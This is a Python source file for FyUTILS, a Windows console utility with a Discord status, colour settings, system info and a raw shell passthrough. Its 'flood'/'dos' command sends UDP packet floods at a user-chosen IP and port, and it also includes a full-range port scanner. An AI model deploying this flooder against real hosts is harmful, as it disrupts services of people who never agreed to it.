try:
    import os
    import platform
    import sys
    import time
    import random
    import socket
    import requests
    import cpuinfo

    from datetime import datetime
    from colorama import Fore, init
    from pypresence import Presence

except:
    os.system("pip install colorama")
    os.system("pip install datetime")
    os.system("pip install pypresence")
    os.system("pip install requests")
    os.system("pip install cpuinfo")

init(convert=True)


def update_status(state):
    try:
        os.system(
            "title FyUTILS " + version + "-" + version_type + " - " + os.getlogin() + "@" + platform.node() + " - " + state)
    except:
        os.system("title " + state)
    try:
        rpc.update(state=state, details="User: " + username, small_image="python",
                   large_image="fyutils", buttons=[{"label": "github.com/NoahOnFyre/FyUTILS", "url": "https://github.com/NoahOnFyre/FyUTILS/releases/latest"}],
                   small_text="Python " + python_version, large_text="FyUTILS v" + version + "-" + version_type,
                   start=int(rpc_start_time))
    except:
        None


def add_command_detail(state):
    try:
        os.system(
            "title FyUTILS " + version + "-" + version_type + " - " + os.getlogin() + "@" + platform.node() + " - " + "Running: " + cmd + " " + state)
    except:
        os.system("title " + state)
    try:
        rpc.update(state="Running: " + cmd + " " + state, details="User: " + username, small_image="python",
                   large_image="fyutils", buttons=[{"label": "github.com/NoahOnFyre/FyUTILS", "url": "https://github.com/NoahOnFyre/FyUTILS/releases/latest"}],
                   small_text="Python " + python_version, large_text="FyUTILS v" + version + "-" + version_type,
                   start=int(rpc_start_time))
    except:
        None


def menu():
    os.system("cls")
    print(color() + "  __________               _____  __   ________   ________   ______       ________")
    time.sleep(0.03)
    print(color() + "  ___  ____/  _____  __    __  / / /   ___  __/   ____  _/   ___  /       __  ___/")
    time.sleep(0.03)
    print(color() + "  __  /_      __  / / /    _  / / /    __  /       __  /     __  /        _____ \ ")
    time.sleep(0.03)
    print(color() + "  _  __/      _  /_/ /     / /_/ /     _  /       __/ /      _  /___      ____/ / ")
    time.sleep(0.03)
    print(color() + "  /_/         _\__, /      \____/      /_/        /___/      /_____/      /____/  ")
    time.sleep(0.03)
    print(color() + "              /____/                                                              ")
    time.sleep(0.03)
    print(Fore.LIGHTBLACK_EX + "╔" + "═" * 119)
    time.sleep(0.03)
    print(Fore.LIGHTBLACK_EX + "║ " + color() + "[VAR] " + Fore.WHITE + "Username:  " + username)
    time.sleep(0.03)
    print(Fore.LIGHTBLACK_EX + "║ " + color() + "[VAR] " + Fore.WHITE + "Device:    " + device)
    time.sleep(0.03)
    print(Fore.LIGHTBLACK_EX + "║ " + color() + "[VAR] " + Fore.WHITE + "Filepath:  " + directory)
    time.sleep(0.03)
    print(Fore.LIGHTBLACK_EX + "║ " + color() + "[VAR] " + Fore.WHITE + "Version:   " + version + "-" + version_type)
    time.sleep(0.03)
    print(Fore.LIGHTBLACK_EX + "╚" + "═" * 119)
    print("")


def color():
    config = open(directory + "\\config.txt").readlines()[0]
    if config.rstrip() == "GREEN":
        rc = Fore.GREEN
    elif config.rstrip() == "LIME":
        rc = Fore.LIGHTGREEN_EX
    elif config.rstrip() == "AQUA" or config == "CYAN":
        rc = Fore.CYAN
    elif config.rstrip() == "YELLOW":
        rc = Fore.YELLOW
    elif config.rstrip() == "PINK" or config == "MAGENTA":
        rc = Fore.MAGENTA
    elif config.rstrip() == "WHITE":
        rc = Fore.WHITE
    elif config.rstrip() == "RED":
        rc = Fore.RED
    elif config.rstrip() == "BLUE":
        rc = Fore.BLUE
    elif config.rstrip() == "LAVA":
        rc = Fore.LIGHTRED_EX
    else:
        return Fore.WHITE
    return rc


def now():
    now = datetime.now().strftime("%H:%M:%S")
    return now


def flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.connect((floodtarget, floodport))
    print(Fore.LIGHTBLACK_EX + "╚" + "═" * 119)
    print("")
    try:
        for i in range(floodattacks):
            sock.send(random.randbytes(1024 * 10))
            print(
                Fore.LIGHTBLACK_EX + "[" + color() + "+" + Fore.LIGHTBLACK_EX + "]" + Fore.WHITE + " Bytes have been sent to " + color() + floodtarget + Fore.LIGHTBLACK_EX + ":" + color() + str(
                    floodport) + Fore.WHITE + "!" + Fore.LIGHTBLACK_EX + " - " + Fore.WHITE + "Thread: " + color() + "Multi-thread working currently not available!" + Fore.LIGHTBLACK_EX + " - " + Fore.WHITE + "Attack: " + color() + str(
                    i + 1), end='\r')
        print("\n")
    except KeyboardInterrupt:
        print(Fore.WHITE + "\nCanceling Action...\n")
    except:
        print(Fore.WHITE + "\nTarget doesn't respond!\n")
        time.sleep(3)


def portscan():
    print(Fore.LIGHTBLACK_EX + "╚" + "═" * 119)
    print("")
    try:
        print(Fore.WHITE + "Preparing scan.", end='\r')
        time.sleep(0.1)
        print(Fore.WHITE + "Preparing scan..", end='\r')
        time.sleep(0.1)
        print(Fore.WHITE + "Preparing scan...", end='\r')
        for scanport in range(1, 65535):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            socket.setdefaulttimeout(0.001)
            result = sock.connect_ex((scantarget, scanport))
            print(
                Fore.LIGHTBLACK_EX + "[" + Fore.RED + "-" + Fore.LIGHTBLACK_EX + "]" + Fore.WHITE + " Scanning Port... " + color() + str(
                    scanport), end='\r')
            if result == 0:
                print(
                    Fore.LIGHTBLACK_EX + "[" + Fore.LIGHTGREEN_EX + "+" + Fore.LIGHTBLACK_EX + "]" + Fore.WHITE + " Port " + color() + str(
                        scanport) + Fore.WHITE + " is open!                  ")
            sock.close()
        print("\n")
    except KeyboardInterrupt:
        print(Fore.WHITE + "\nCanceling Action...\n")
    except:
        print(Fore.WHITE + "\nTarget doesn't respond!\n")
        time.sleep(3)


os.system("title Initializing RPC")

try:
    rpc = Presence("1005822803997638696")
    rpc.connect()
    rpc_start_time = time.time()
    update_status("Starting up...")
except:
    print(Fore.WHITE + "An error occurred while trying to connect to the RPC.")
    time.sleep(0.5)

os.system("title Starting up...")

#
# Variable initialisation
#

username = os.getlogin()
device = platform.node()
directory = sys.path.__getitem__(0)
threads = os.cpu_count()
version = "1.1"
version_type = "STABLE"
private_ip = socket.gethostbyname(socket.gethostname())
try:
    public_ip = requests.get("https://api.ipify.org").content.decode()
except:
    public_ip = "Not online!"
python_version = sys.version
cpu = cpuinfo.get_cpu_info()['brand_raw']

#
# Config initialisation
#

try:
    open(directory + "\\config.txt").readlines()[0]
except:
    print("Config not found! Creating config...")
    time.sleep(0.03)
    open(directory + "\\config.txt", "x").writelines("AQUA")
    time.sleep(0.03)
    print(Fore.WHITE + "Please restart FyUTILS!")
    time.sleep(0.03)
    os.system("pause")
    time.sleep(0.03)
    sys.exit()

menu()

try:
    cmd = sys.argv.__getitem__(1)
    cmd_set = True
except IndexError:
    cmd_set = False

while True:
    try:
        update_status("Idle")
        try:
            if not cmd_set:
                cmd = input(Fore.LIGHTBLACK_EX + "╔═══[" + color() + username + Fore.LIGHTBLACK_EX + "@" + Fore.WHITE + device + Fore.LIGHTBLACK_EX + "]═══(" + color() + "FyUTILS " + Fore.WHITE + version + Fore.LIGHTBLACK_EX + "-" + Fore.WHITE + version_type + Fore.LIGHTBLACK_EX + ")" + "\n" + "╚═══" + Fore.LIGHTBLACK_EX + "> " + Fore.WHITE).lower()
            else:
                print(Fore.LIGHTBLACK_EX + "╔═══[" + Fore.RED + "SYSTEM" + Fore.LIGHTBLACK_EX + "@" + Fore.WHITE + device + Fore.LIGHTBLACK_EX + "]═══(" + color() + "FyUTILS " + Fore.WHITE + version + Fore.LIGHTBLACK_EX + "-" + Fore.WHITE + version_type + Fore.LIGHTBLACK_EX + ")" + "\n" + "╚═══" + Fore.LIGHTBLACK_EX + "> " + Fore.WHITE + cmd)
                cmd_set = False
        except KeyboardInterrupt:
            update_status("Shutting down...")
            print(Fore.WHITE + "Shutting down FyUTILS...")
            time.sleep(1)
            rpc.close()
            sys.exit()
        update_status("Running: " + cmd)

        if cmd == "exit" or cmd == "quit":
            update_status("Shutting down...")
            print("")
            print(Fore.WHITE + "Shutting down FyUTILS...")
            time.sleep(1)
            try:
                rpc.close()
            except:
                None
            sys.exit()

        elif cmd == "rl" or cmd == "reload" or cmd == "clear" or cmd == "cls" or cmd == "new":
            print("")
            update_status("Reloading...")
            print("")
            menu()

        elif cmd == "flood" or cmd == "dos":
            print("")
            print(Fore.LIGHTBLACK_EX + "╔" + "═" * 119)
            try:
                floodtarget = input(Fore.LIGHTBLACK_EX + "║ " + Fore.WHITE + "Target IP" + Fore.LIGHTBLACK_EX + " > " + Fore.WHITE)
                floodport = int(input(Fore.LIGHTBLACK_EX + "║ " + Fore.WHITE + "Target port" + Fore.LIGHTBLACK_EX + " > " + Fore.WHITE))
                floodattacks = int(input(Fore.LIGHTBLACK_EX + "║ " + Fore.WHITE + "Attacks" + Fore.LIGHTBLACK_EX + " > " + Fore.WHITE))
                add_command_detail(floodtarget + ":" + str(floodport))
                flood()
            except:
                None

        elif cmd == "color" or cmd == "clr":
            print("")
            print(Fore.LIGHTBLACK_EX + "╔" + "═" * 119)
            try:
                colorvalue = input(Fore.LIGHTBLACK_EX + "║ " + Fore.WHITE + "Value" + Fore.LIGHTBLACK_EX + " > " + Fore.WHITE).upper()
                add_command_detail(colorvalue)
                open(directory + "\\config.txt", "w").writelines(colorvalue)
                print(Fore.LIGHTBLACK_EX + "║ " + Fore.WHITE + "Changes saved to file!")
                print(Fore.LIGHTBLACK_EX + "╚" + "═" * 119)
                print("")
            except:
                print("")

        elif cmd == "resetconfig" or cmd == "rcnf" or cmd == "configreset":
            print("")
            update_status("Resetting config files...")
            print(Fore.LIGHTBLACK_EX + "╔" + "═" * 119)
            try:
                print(Fore.LIGHTBLACK_EX + "║ " + Fore.WHITE + "The config has been reset!")
                print(Fore.LIGHTBLACK_EX + "╚" + "═" * 119)
                open(directory + "\\config.txt", "w").writelines("AQUA")
                print("")
            except:
                print("")

        elif cmd == "vars" or cmd == "variables" or cmd == "var":
            print("")
            update_status("Resetting config files...")
            print(Fore.LIGHTBLACK_EX + "╔" + "═" * 119)
            time.sleep(0.03)
            print(Fore.LIGHTBLACK_EX + "║ " + color() + "[VAR] " + Fore.WHITE + "Username:  " + username)
            time.sleep(0.03)
            print(Fore.LIGHTBLACK_EX + "║ " + color() + "[VAR] " + Fore.WHITE + "Device:    " + device)
            time.sleep(0.03)
            print(Fore.LIGHTBLACK_EX + "║ " + color() + "[VAR] " + Fore.WHITE + "Filepath:  " + directory)
            time.sleep(0.03)
            print(Fore.LIGHTBLACK_EX + "║ " + color() + "[VAR] " + Fore.WHITE + "Threads:   " + str(threads))
            time.sleep(0.03)
            print(Fore.LIGHTBLACK_EX + "║ " + color() + "[VAR] " + Fore.WHITE + "Version:   " + version + "-" + version_type)
            time.sleep(0.03)
            print(Fore.LIGHTBLACK_EX + "║ " + color() + "[VAR] " + Fore.WHITE + "Private:   " + private_ip)
            time.sleep(0.03)
            print(Fore.LIGHTBLACK_EX + "║ " + color() + "[VAR] " + Fore.WHITE + "Public:    " + public_ip)
            time.sleep(0.03)
            print(Fore.LIGHTBLACK_EX + "║ " + color() + "[VAR] " + Fore.WHITE + "Python:    " + python_version)
            time.sleep(0.03)
            print(Fore.LIGHTBLACK_EX + "║ " + color() + "[VAR] " + Fore.WHITE + "CPU:       " + cpu)
            time.sleep(0.03)
            print(Fore.LIGHTBLACK_EX + "╚" + "═" * 119)
            print("")

        elif cmd == "portscan" or cmd == "scanport":
            print("")
            print(Fore.LIGHTBLACK_EX + "╔" + "═" * 119)
            try:
                scantarget = input(Fore.LIGHTBLACK_EX + "║ " + Fore.WHITE + "Target IP" + Fore.LIGHTBLACK_EX + " > " + Fore.WHITE)
                add_command_detail(scantarget)
                portscan()
            except:
                None

        else:
            os.system(cmd)
            print(Fore.WHITE)

        update_status("Idle")
    except KeyboardInterrupt:
        print("")
